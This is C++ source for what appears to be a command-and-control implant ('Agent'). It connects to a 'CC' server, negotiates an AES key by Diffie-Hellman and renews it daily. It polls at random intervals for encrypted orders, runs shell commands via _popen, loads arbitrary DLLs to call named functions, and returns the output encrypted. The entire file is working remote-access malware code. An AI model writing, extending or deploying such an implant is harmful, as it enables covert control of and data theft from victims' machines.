#include "Agent.h"
// declaration for the delegate
typedef string(*LPGETNUMBER)(string);

/*
	split the command from the server by space
*/
vector<string> split(string str)
{
	istringstream iss(str);
	vector<string> tokens;
	copy(istream_iterator<string>(iss),
		istream_iterator<string>(),
		back_inserter(tokens));

	return tokens;
}
/*
	Agent Construcor
	Creates a socket and new symetric key thats being shared with diffie hellman
	runs thread that renews the shared key every 24 hours
	runs function that gets commands from server between 2 and 3 minutes

*/
Agent::Agent()
{
	recvbuflen = DEFAULT_BUFLEN;

	CreateSocket();
	CreateNewSymetricKey();
	aes = AES_crypto(sharedKey);

	byte key[32];

	thread t1(&Agent::CreateNewSymetricKeyWithThread, this);
	t1.detach();
	
	GetRequestFromServer();
}

/*
	Create socket to CC
*/
void Agent::CreateSocket()
{
	mySocket = Socket(SERVER_ADDRESS, DEFAULT_PORT);
	iResult = mySocket.Get_iResult();
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		exit(1);
	}

	// Resolve the server address and port
	iResult = mySocket.Resolve();
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		exit(1);
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = mySocket.GetResult(); ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		mySocket.CreateSocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (mySocket.GetSocket() == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			mySocket.Cleanup(false);
			exit(1);
		}

		// Connect to server.
		iResult = mySocket.Connect(ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			mySocket.Cleanup(true);
			continue;
		}
		break;
	}

	if (mySocket.GetSocket() == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		mySocket.Cleanup(false);
		exit(1);
	}

	recvbuf[0] = '\0';
}
/*
	Create New Symetric Key from diffie hllmaan shared secret
*/
void Agent::CreateNewSymetricKey()
{
	DiffieHelman dh;

	string p = dh.get_p();
	p.erase(remove(p.begin(), p.end(), '.'), p.end());
	string message = string(p).append(" ").append(to_string(dh.get_g()));	
	SendMessageToServer(message.c_str(), message.length(), (char*)"1 ");
	ReciveMessage();
	vector<string> res = split(string(recvbuf));
	vector<string>::iterator it = res.begin();
	if (!strcmp(it->c_str(), "2"))
	{
		++it;
		sharedKey = dh.set_sheard_key(it->c_str());
		sharedKey.erase(remove(sharedKey.begin(), sharedKey.end(), '.'), sharedKey.end());
	}

	//Sleep(10000);
	recvbuf[0] = '\0';
	string pubKey = dh.get_public_key();
	pubKey.erase(remove(pubKey.begin(), pubKey.end(), '.'), pubKey.end());
	message = string(pubKey);
	SendMessageToServer(message.c_str(), message.length(), (char*)"2 ");
	ReciveMessage();
}
/*
	renew the key every 24 hours
*/
void Agent::CreateNewSymetricKeyWithThread()
{
	while (true)
	{
		Sleep((size_t)MILLISECONDS);
		CreateNewSymetricKey();
	}
	
}

/*
	Get request from server and execute the command or call a function in components
	Do this every 1-2 minutes
*/
void Agent::GetRequestFromServer()
{
	while (true)
	{
		recvbuf[0] = '\0';
		string message = string(REQUEST_STRING);

		try
		{
			//send and receive messages
			SendMessageToServer(message.c_str(), message.size(), (char*)"3", true);
			ReciveMessage();


			string req = string(recvbuf);
			if (req.empty())
			{
				Cleanup();
				break;
			}
			string x = aes.Decrypt(req);
			if (!x.empty() && x.size() != 2)
			{
				vector<string> res = split(x);
				vector<string>::iterator it = res.begin();

				// Take action from command
				if (!strcmp(it->c_str(), "3"))
				{
					string responce;

					++it;
					string todo = *it;
					++it;
					if (!todo.compare("cmd"))
					{
						string action = "";
						while (it != res.end())
						{
							action.append(*it + " ");
							it++;
						}
						responce = action.empty() ? "" : exec(action);
					}
					else if (!todo.compare("func"))
					{
						string library = *it;
						string func = *(++it);
						string cmd = "";
						while (++it != res.end())
						{
							cmd.append(*it + " ");
						}
						responce = runDynamicFunction(library, func, cmd);
					}

					if (!responce.empty())
					{
						recvbuf[0] = '\0';
						string message = string(responce);

						//send and receive messages
						SendMessageToServer(message.c_str(), message.size(), (char*)"4", true);
						ReciveMessage();
					}
				}
			}
			double r = ((double)rand() / (RAND_MAX));

			Sleep(r * 30 * 1000);
		}
		catch (exception &e)
		{
			std::exception_ptr p = std::current_exception();
			break;
		}
	}
}
/*
	Take message and send it to server
*/
void Agent::SendMessageToServer(const char * message, size_t length, char *code, bool encrypt)
{
	int size = strlen(message);
	int chunkcount = size / 1023;
	int lastchunksize = size - (chunkcount * 1023);
	int fileoffset = 0;
	int iResult;

	//Sending Actual Chunks
	while (chunkcount > 0)
	{
		string m;
		if (encrypt)
		{
			m = aes.Encrypt(string(message + (fileoffset * 1023), 1023));
		}
		else
		{
			m = string(message + (fileoffset * 1023), 1023);
		}
		m = string(code).append(m);
		iResult = mySocket.SendToServer(m.c_str(), m.length());
		fileoffset++;
		chunkcount--;

		if (iResult == SOCKET_ERROR) {
			printf("send failed with error: %d\n", WSAGetLastError());
			mySocket.Cleanup(true);
			return;
		}
	}

	//Sending last Chunk
	string m;
	if (encrypt)
	{
		m = aes.Encrypt(string(message + (fileoffset * 1023), min(lastchunksize, 1023)));
	}
	else
	{
		m = string(message + (fileoffset * 1023), min(lastchunksize, 1023));
	}
	m = string(code).append(m);
	iResult = mySocket.SendToServer(m.c_str(), m.length());

	printf("Bytes Sent: %ld\n", iResult);
}

/*
	Receive answer from server by reading constant amount of bytes
*/
void Agent::ReciveMessage()
{
	// Receive until the peer closes the connection
	//do {
	try
	{
		iResult = mySocket.ReciveFromServer(recvbuf, recvbuflen);
		if (iResult > 0)
			printf("Bytes received: %d\n", iResult);
		else if (iResult == 0)
			printf("Connection closed\n");
		else
			printf("recv failed with error: %d\n", WSAGetLastError());
	}
	catch (...)
	{

	}
	//} while (iResult > 0);
}
/*
  // shutdown the connection since no more data will be sent
*/
void Agent::Shutdown()
{
	// shutdown the connection since no more data will be sent
	iResult = mySocket.ShutdownConnection();
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		mySocket.Cleanup(true);
	}
}
// Cleanup
void Agent::Cleanup()
{
	mySocket.Cleanup(true);
}
/*
	run Dynamic Function 
	Input: name of dll, the function, commands to function
	Output: stdout
*/
string Agent::runDynamicFunction(string library, string function, string cmd)
{
	try {
		HINSTANCE hinstDLL = LoadLibrary(library.c_str());
		LPGETNUMBER func = (LPGETNUMBER)GetProcAddress(hinstDLL, function.c_str());
		string res;
		if (func != NULL)
		{
			res = func(cmd);
		}
		FreeLibrary(hinstDLL);
		cout << "free " << GetLastError() << endl;
		return res;
	}
	catch (...)
	{

	}
}

/*
	commands to be executed in command line
	Input: command
	Output: stdout
*/
string Agent::exec(string cmd)
{
	char buffer[128];
	string result = "";
	FILE *pipe = _popen(cmd.c_str(), "r");
	try
	{
		while (!feof(pipe))
		{
			if (fgets(buffer, 128, pipe) != NULL)
			{
				result += buffer;
			}
		}
	}
	catch(...)
	{
		_pclose(pipe);
	}

	_pclose(pipe);
	return result;
}

